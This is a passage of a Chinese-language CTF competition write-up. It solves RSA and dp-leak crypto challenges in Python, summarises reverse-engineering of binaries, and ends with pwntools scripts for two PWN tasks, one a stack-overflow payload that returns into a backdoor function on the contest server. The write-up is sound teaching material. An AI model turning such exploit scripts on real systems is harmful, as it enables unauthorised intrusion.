cipher_b64 = "HhVz1mA88Zuc5CBKvTenEEnnVudGraXGYrqSerB62Xoj5NNbZUbf5EDUQKjviNmZfl4DGefDnFNxWBB+Es2+wg=="  
  
n = int("00b0596e804a0c355cf70881708aedb8091acb936d45cda0230d3b3d9a54c563d7d6a5c8cf391754fbb7bfa255f94bae3384f89fcedd2a45b84897421c1ea2821f", 16)  
d = int("48fc7a9376121f73de7a12b875877587af235a5cfb6ae3401e95ca2539b8885d78781b5fe675cef96792399c94ceff36509c99d3a9349d50c269cc9458363b01", 16)  
  
c = int.from_bytes(base64.b64decode(cipher_b64), "big")  
m = pow(c, d, n)  
  
flag = m.to_bytes((n.bit_length() + 7) // 8, "big").lstrip(b"\x00")  
print(flag.decode())
```
得到flag`SYC{PEM_1s_n0t_only_S5l}`
## dp_spill
**题目把 `d` 用 CRT 构造，使得 `d ≡ d_p (mod p-1)` 且 `d_p` 很小（`BITS = 20`）**。因此对任意符合条件的 `d_p`：
- `e * d ≡ 1 (mod (p-1)(q-1))`，于是取模 `p-1` 可得 `e * d_p ≡ 1 (mod p-1)`，也就是说 `p-1` 整除 `e*d_p - 1`。
- 因而对于任意与 `p` 互素的基 `a`，有 `a^{e*d_p - 1} ≡ 1 (mod p)`，但通常不等于 `1 (mod q)`。所以
    g=gcd⁡(a edp−1 ⁣− ⁣1,  n)g=\gcd(a^{\,e d_p-1}\!-\!1,\;n)g=gcd(aedp​−1−1,n)
    很可能会等于 `p`（或 `q` 的非平凡因子），从而把 `n` 因数分解出来。
基于上面观察，只需枚举所有可能的 `d_p`（题里上限是 `2^{20}`≈1,048,576），对每个 `d_p` 计算 `M = e*d_p - 1`，然后取某个基（常用 2 或随机基）做 `a^M mod n` 并做 gcd。如果得到的 gcd 既不是 1 也不是 n，就找到了一个因子，随后算出 `p+q` 并输出 `SYC{sha256(p+q)}`。
```python
import hashlib  
from math import gcd  
  
n = 59802493250926859707985963604065644706006753432029457979480870189591634515944547801582044132550574140049396756158974108666587177618882259807156459782125677704143102175791607852135852403246382056816004306499712131698646815738798243056590111291799398438023345030391834782966046976995917844819454047154287312391  
e = 55212884840887233646138079973875295799093171847359460085387084716906818593689341421818829383370282800231404248386041253598996862719171485530961860941585382910224531768283026267484780257269526617362183903996384696040145787076592207619279689647074176697837752679360230601598541884491676076657287130000027117241  
  
a = 2  
pow_a_e = pow(a, e, n)  
inv_a = pow(a, -1, n)  
  
cur = 1  
for d_p in range(1, 1 << 20):  
    cur = (cur * pow_a_e) % n  
    x = (cur * inv_a) % n  
    g = gcd(x - 1, n)  
    if 1 < g < n:  
        p = g  
        q = n // g  
        s = str(p + q).encode()  
        print("SYC{" + hashlib.sha256(s).hexdigest() + "}")  
        break
```
得到flag`SYC{644684707c540998d760975fb98a816a469ec567abe5c8004164d3ce887c6a8e}`
# REVERSE

## encode

- 用`IDA`打开后，发现输入后进行异或后再进行base64，进行比较，然后写出exp，解出后不对，重新查看反汇编，发现`scanf`函数被重构了，重新分析后，发现加密流程是，输入->PKCS7填充->TEA加密->异或0X5A->base64->进行比较

- 根据流程，写出exp即可解出

![123](https://youke1.picui.cn/s1/2025/11/24/6924159309b3c.png)

## ez_pyyy

- 先借助`Python`带的dis功能进行反汇编，程序流程：输入->转为`UTF-8`->每个字节与17进行异或->对每个字节进行高低4为交换->反转字节序列->循环左移32位->进行比较

- 写出exp求解

![123](https://youke1.picui.cn/s1/2025/11/24/692418b3e463a.png)

## only flower

- 用`ida`打开后，发现由于栈不平衡，他不中用了，打开汇编，开始nop

![屏幕截图 2025-11-24 165254.png](https://youke1.picui.cn/s1/2025/11/24/69241cd0506cd.png)

- 开始写exp

![屏幕截图 2025-11-24 165242.png](https://youke1.picui.cn/s1/2025/11/24/69241cd076137.png)

## ezRu3t

- 打开IDA分析后，一团乱麻，查看字符串，有标准的`base64`和`base85`的表和一串看着像密文的字符串，再返回函数查看，对密文先进行`base85`解密,再用`base64`解密，flag到手

## QYQSの奇妙冒险

- IDA打开后，即可看到加密方式和密钥，直接写出对应的exp即可

![屏幕截图 2025-11-24 170539.png](https://youke1.picui.cn/s1/2025/11/24/69241fcb99a7a.png)

## QYQSの奇妙冒险2

- 静态分析后无果，动调了试试，发现在汇编有代码进行选择，当前程序加密流程是

```

mov     [rbp+2D0h+var_15C], 1BF52h     ; 初始化状态值(114,514)

  

; 加密循环核心算法

mov     eax, [rbp+rax*4+2D0h+var_250]  ; 从数组取值

add     ecx, eax                       ; 加到状态值

movsx   eax, [rbp+rax+2D0h+var_27C]    ; 取移位位数

shl     eax, cl                        ; 左移位

xor     eax, [rbp+2D0h+var_15C]        ; 与状态值异或

```

- 而且加密完与全局数组 unk_7FF6ECF3F000 比较

- 那么动调后查看数组，就获得了flag

![屏幕截图 2025-11-24 171833.png](https://youke1.picui.cn/s1/2025/11/24/692424b05c0df.png)
## ez_SMC

- 先分析加密流程，发现`encodee`函数无法直接打开，通过动调修改后，得到了汇编代码，是base64加密

- 加密流程，RC4加密->字节转十六进制字符串->base64->base58

- 写出exp即可

![屏幕截图 2025-11-24 200158.png](https://youke1.picui.cn/s1/2025/11/24/692449219714b.png)

# PWN

## Mission Calculator

- 参看代码后，发现只需不断交互，提交计算的答案即可获得权限

~~~

from pwn import *

  

# 连接服务器

p = remote("geek.ctfplus.cn", 31504)

banner = p.recvuntil(b"Press any key to start...", timeout=10).decode()

p.sendline(b"")

for i in range(50):

    question = p.recvuntil(b' = ', timeout=5).decode()

    parts = question.split()

    num1 = int(parts[2])

    num2 = int(parts[4])  

    product = num1 * num2

    p.sendline(str(product).encode())

    response = p.recvline(timeout=3).decode().strip()

    final_response = p.recvuntil(b'Congratulations!', timeout=5).decode()

    print(f"最终响应: {final_response}")

  

    # 接收win()函数的输出（flag）

    flag_info = p.recvall(timeout=5).decode()

p.interactive()

p.close()

~~~

## Mission Cipher Text

- 发现这题可以通过栈溢出来获取权限

~~~

from pwn import *

  

context.log_level = 'debug'  # 开启调试信息

context.arch = 'amd64'

p = remote('geek.ctfplus.cn', 30210)

  

p.recvuntil(b'choice > ')

p.sendline(b'2')

p.recvuntil(b'Please enter your feedback:')

  

padding = b'A' * 40

backdoor_addr = p64(0x4014AB)

payload = padding + backdoor_addr

print(f"Sending payload length: {len(payload)}")

p.send(payload)

p.interactive()

~~~
